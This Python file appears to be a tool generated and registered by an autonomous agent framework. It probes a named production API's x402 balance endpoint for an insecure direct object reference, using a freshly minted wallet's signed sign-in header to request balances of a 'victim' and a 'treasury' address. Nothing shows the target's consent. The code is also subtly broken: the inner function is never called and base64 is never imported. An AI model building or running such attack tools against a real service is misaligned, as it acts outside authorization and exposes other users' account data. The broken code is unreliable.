"""VOIDFORGE :: forged tool — siwx_balance_idor_v2
SIWX x402 balance IDOR test v2 — bulletproof: mints EVM wallet (pure secp256k1+keccak), signs SIWX challenge, compares own-path control vs victim-path strike vs treasury-path strike; returns JSON always (traceback on fatal)
Forged by the strategist on 2026-09-01. Edit freely; delete the file to disarm.
"""
import json, re, time, urllib.request, urllib.error


def run(base=None, victim_address=None):
    import json, time, os, traceback, urllib.request, urllib.error, ssl

    def run(**kwargs):
        try:
            victim = kwargs.get("victim_address", "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045")
            base = kwargs.get("base", "https://api.venice.ai").rstrip("/")
            ctx = ssl.create_default_context()
            UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

            RC = [0x0000000000000001,0x0000000000008082,0x800000000000808A,0x8000000080008000,
                  0x000000000000808B,0x0000000080000001,0x8000000080008081,0x8000000000008009,
                  0x000000000000008A,0x0000000000000088,0x0000000080008009,0x000000008000000A,
                  0x000000008000808B,0x800000000000008B,0x8000000000008089,0x8000000000008003,
                  0x8000000000008002,0x8000000000000080,0x000000000000800A,0x800000008000000A,
                  0x8000000080008081,0x8000000000008080,0x0000000080000001,0x8000000080008008]
            ROT = [[0,36,3,41,18],[1,44,10,45,2],[62,6,43,15,61],[28,55,25,21,56],[27,20,39,8,14]]
            def rol(x, n):
                n %= 64
                return ((x << n) | (x >> (64 - n))) & 0xFFFFFFFFFFFFFFFF
            def keccak256(data):
                state = [0] * 25
                rate = 136
                padded = bytearray(data)
                padded.append(0x01)
                while len(padded) % rate != 0:
                    padded.append(0)
                padded[-1] |= 0x80
                for bs in range(0, len(padded), rate):
                    block = padded[bs:bs + rate]
                    for i in range(rate // 8):
                        state[i] ^= int.from_bytes(block[i*8:(i+1)*8], 'little')
                    for rnd in range(24):
                        C = [state[x] ^ state[x+5] ^ state[x+10] ^ state[x+15] ^ state[x+20] for x in range(5)]
                        D = [C[(x-1) % 5] ^ rol(C[(x+1) % 5], 1) for x in range(5)]
                        for x in range(5):
                            for y in range(5):
                                state[x + 5*y] ^= D[x]
                        B = [0] * 25
                        for x in range(5):
                            for y in range(5):
                                B[y + 5*((2*x + 3*y) % 5)] = rol(state[x + 5*y], ROT[x][y])
                        for x in range(5):
                            for y in range(5):
                                state[x + 5*y] = B[x + 5*y] ^ ((~B[(x+1) % 5 + 5*y]) & B[(x+2) % 5 + 5*y])
                        state[0] ^= RC[rnd]
                return b''.join(state[i].to_bytes(8, 'little') for i in range(4))

            P = 2**256 - 2**32 - 977
            N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
            G = (0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
                 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)
            def inv(a, m): return pow(a, m - 2, m)
            def padd(p, q):
                if p is None: return q
                if q is None: return p
                if p[0] == q[0] and (p[1] + q[1]) % P == 0: return None
                if p == q: l = 3 * p[0] * p[0] % P * inv(2 * p[1], P) % P
                else: l = (q[1] - p[1]) * inv((q[0] - p[0]) % P, P) % P
                x = (l * l - p[0] - q[0]) % P
                return (x, (l * (p[0] - x) - p[1]) % P)
            def pmul(k, pt):
                r = None
                k %= N
                while k:
                    if k & 1: r = padd(r, pt)
                    pt = padd(pt, pt)
                    k >>= 1
                return r
            def addr_from_priv(d):
                pub = pmul(d, G)
                return '0x' + keccak256(pub[0].to_bytes(32, 'big') + pub[1].to_bytes(32, 'big'))[12:].hex()
            def sign_eip191(msg_bytes, d):
                z = int.from_bytes(keccak256(b'\x19Ethereum Signed Message:\n' + str(len(msg_bytes)).encode() + msg_bytes), 'big')
                k = int.from_bytes(keccak256(d.to_bytes(32, 'big') + z.to_bytes(32, 'big') + os.urandom(8)), 'big') % N
                R = pmul(k, G)
                r = R[0] % N
                s = inv(k, N) * (z + r * d) % N
                recid = R[1] & 1
                if s > N // 2:
                    s = N - s
                    recid ^= 1
                return r, s, 27 + recid

            def http(url, headers=None):
                h = {"User-Agent": UA, "Accept": "application/json"}
                if headers: h.update(headers)
                req = urllib.request.Request(url, headers=h)
                try:
                    with urllib.request.urlopen(req, timeout=25, context=ctx) as resp:
                        return resp.status, resp.read().decode('utf-8', 'replace')
                except urllib.error.HTTPError as e:
                    return e.code, e.read().decode('utf-8', 'replace')
                except Exception as e:
                    return 0, "TRANSPORT_ERR: " + str(e)

            kst = keccak256(b'').hex() == 'c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470'
            out = {"keccak_selftest": kst}
            st, body = http(f"{base}/api/v1/x402/balance/{victim}")
            out["challenge_status"] = st
            ch = json.loads(body)
            info = ch["extensions"]["sign-in-with-x"]["info"]
            out["nonce"] = info.get("nonce")
            d = int.from_bytes(os.urandom(32), 'big') % N
            my = addr_from_priv(d)
            out["my_wallet"] = my
            msg = (f"{info['domain']} wants you to sign in with your Ethereum account:\n"
                   f"{my}\n\n"
                   f"{info.get('statement', 'Sign in to Venice AI')}\n\n"
                   f"URI: {info['uri']}\n"
                   f"Version: {info.get('version', '1')}\n"
                   f"Chain ID: 8453\n"
                   f"Nonce: {info['nonce']}\n"
                   f"Issued At: {info['issuedAt']}\n"
                   f"Expiration Time: {info['expirationTime']}")
            r, s, v = sign_eip191(msg.encode(), d)
            sig = '0x' + r.to_bytes(32, 'big').hex() + s.to_bytes(32, 'big').hex() + bytes([v]).hex()
            siwx = base64.b64encode(json.dumps({
                "address": my, "message": msg, "signature": sig,
                "timestamp": int(time.time() * 1000), "chainId": "eip155:8453"
            }).encode()).decode()
            hdr = {"SIGN-IN-WITH-X": siwx}
            st1, b1 = http(f"{base}/api/v1/x402/balance/{my}", hdr)
            out["control_own_path"] = {"status": st1, "body": b1[:400]}
            st2, b2 = http(f"{base}/api/v1/x402/balance/{victim}", hdr)
            out["strike_victim_path"] = {"status": st2, "body": b2[:400]}
            st3, b3 = http(f"{base}/api/v1/x402/balance/0x2670b922ef37c7df47158725c0cc407b5382293f", hdr)
            out["strike_treasury_path"] = {"status": st3, "body": b3[:400]}
            return json.dumps(out)
        except Exception:
            return json.dumps({"fatal": True, "traceback": traceback.format_exc()[:1500]})


from tools import register as _vf_register
_vf_register('forged_siwx_balance_idor_v2', 'SIWX x402 balance IDOR test v2 — bulletproof: mints EVM wallet (pure secp256k1+keccak), signs SIWX challenge, compares own-path control vs victim-path strike vs treasury-path strike; returns JSON always (traceback on fatal)', {'properties': {'base': {'type': 'string'}, 'victim_address': {'type': 'string'}}, 'required': [], 'type': 'object'}, 'active')(run)
